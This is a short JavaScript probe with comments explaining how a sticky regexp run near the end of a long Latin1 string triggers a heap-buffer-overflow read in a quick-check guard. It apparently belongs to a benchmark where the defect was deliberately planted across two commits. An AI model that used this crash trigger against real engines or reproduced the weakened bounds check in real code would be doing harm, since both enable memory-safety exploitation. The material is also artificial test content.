// Probe for the multi-commit memory-safety defect composed from:
//   Bug 2060702 "Shrink RegExpShared"      (adds RegExpShared::QuickCheckLeadingChars = 1)
//   Bug 2060702 "Support RegExp quickcheck" (quickCheckRejects guards its 4-byte mask
//                                            read with `index + QuickCheckLeadingChars`)
//
// A sticky regexp gets a quick-check mask filter. Running it near the end of a
// heap-allocated Latin1 string makes quickCheckRejects() memcpy a 4-byte word
// starting at `index` after only checking that 1 (not 4) character remains,
// reading past the end of the string buffer. ASan: heap-buffer-overflow READ.
//
// Clean on the untampered window: there the guard is `index + sizeof(uint32_t)
// <= length`, which correctly requires 4 remaining characters.
var s = "a".repeat(200);          // long => heap-allocated (malloc'd) Latin1 chars
var re = /abcd/y;                 // sticky => quick-check filter, no search prefix
for (var i = 0; i < 2000; i++) {  // warm up so the regexp is compiled (sets quick-check data)
  re.lastIndex = 0;
  re.exec(s);
}
re.lastIndex = s.length - 1;      // start one char before the end
re.exec(s);                       // -> RegExpShared::execute -> quickCheckRejects -> OOB read
print("no crash");
